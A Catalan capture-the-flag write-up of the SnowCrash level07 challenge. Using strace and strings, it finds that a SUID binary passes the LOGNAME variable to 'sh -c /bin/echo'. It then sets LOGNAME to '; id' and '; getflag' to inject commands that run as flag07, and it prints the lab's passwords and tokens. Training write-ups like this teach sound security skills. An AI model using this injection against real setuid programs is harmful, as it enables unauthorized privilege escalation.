# TL;DR / TLTR
##### Ens connectem al següent nivell amb el token/password obtingut en el nivell anterior:
```bash
level06@SnowCrash:~$ ssh level07@SnowCrash -p 4242
Could not create directory '/home/user/level06/.ssh'.
The authenticity of host '[snowcrash]:4242 ([127.0.1.1]:4242)' can't be established.
ECDSA key fingerprint is 6a:83:c6:2e:df:7a:c8:e0:1c:bc:d8:84:32:e0:84:ad.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/user/level06/.ssh/known_hosts).
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          
level07@snowcrash's password: wiok45aaoguiboiki2tuin6ub
```
##### Llistem el /hom del usauri level07
```bash
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```
##### Observem que hi ha un fitxer anomenat level07 amb propietat de flag07 i amb permisos de SUID ('s')
```bash
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```
##### Provem un comandament anomenat strace que mostra totes les cride al sistema que fa el binari. per tal de veure si el binar crida als comandaments (ls, cat, echo...etc) sense el path absolut
```bash
level07@SnowCrash:~$ strace ./level07 
execve("./level07", ["./level07"], [/* 27 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1730024, ...}) = 0
mmap2(NULL, 1739484, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e2c000
mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3) = 0xb7fcf000
mmap2(0xb7fd2000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e2b900, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
getegid32()                             = 2007
geteuid32()                             = 2007
setresgid32(2007, 2007, 2007)           = 0
setresuid32(2007, 2007, 2007)           = 0
brk(0)                                  = 0x804b000
brk(0x806c000)                          = 0x806c000
rt_sigaction(SIGINT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGQUIT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbffff60c) = 2534
waitpid(2534, level07
[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 2534
rt_sigaction(SIGINT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD (Child exited) @ 0 (0) ---
exit_group(0)
```
##### Sabem que 2007 és level07 i 3007 és flag07
```bash
level07@SnowCrash:~$ id
uid=2007(level07) gid=2007(level07) groups=2007(level07),100(users)
level07@SnowCrash:~$ id level07
uid=2007(level07) gid=2007(level07) groups=2007(level07),100(users)
level07@SnowCrash:~$ id flag07
uid=3007(flag07) gid=3007(flag07) groups=3007(flag07),1001(flag)
```
###### Però com que no hem vist cap vulnerabilitat, provem de seguir els processos fills (fork/clone) dels execve que executen els comandaments (ls, echo...)
```bash
level07@SnowCrash:~$ strace -f ./level07 2>&1 | grep execve
execve("./level07", ["./level07"], [/* 27 vars */]) = 0
[pid  2644] execve("/bin/sh", ["sh", "-c", "/bin/echo level07 "], [/* 27 vars */]) = 0
[pid  2645] execve("/bin/echo", ["/bin/echo", "level07"], [/* 27 vars */]) = 0 
```
###### Línia a remarcar
```bash
[pid  2644] execve("/bin/sh", ["sh", "-c", "/bin/echo level07 "], [/* 27 vars */]) = 0
```
###### Desglossament per entendre la línia
```text
sh -c → interpreta una string com comanda
Per tant, si podem controlar aquesta string, podrem injectar comandes
```
###### Com que "sh -c" ve de echo. Buscarem amb strings si hi ha algun echo que ens mostri alguna vulnerabilitat
```bash
level07@SnowCrash:~$ strings level07 | grep echo
/bin/echo %s 
```
###### Analitzem la troballa
```text
/bin/echo %s
%s → és un placeholder del llenguatge de programació C (printf)
És a dir que el programa està fent alguna cosa com, printf("/bin/echo %s", variable);
Per tant si /bin/echo %s → /bin/echo level07
%s = level07
```
##### Arribem a la conclusió de que si fa: sh -c "/bin/echo level07" podríemcanviar la variable LOGNAME de env per una variable vulnerable quan fos cridada per la línia vulnerable esmentada anteriorment
```bash
export LOGNAME="; id"
```
###### El pròxim que cop que s'executés passaria el següent:
```text
sh -c "/bin/echo $LOGNAME" en comptes de trobar "level07", trobaria "; id"
```
##### Posem en pràctica el que comentavem
```bash
level07@SnowCrash:~$ env | grep LOGNAME
LOGNAME=level07
level07@SnowCrash:~$ export LOGNAME="; id"
level07@SnowCrash:~$ env | grep LOGNAME
LOGNAME=; id
level07@SnowCrash:~$ ./level07

uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
level07@SnowCrash:~$ export LOGNAME="; getflag"
level07@SnowCrash:~$ env | grep LOGNAME
LOGNAME=; getflag
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$ 
```

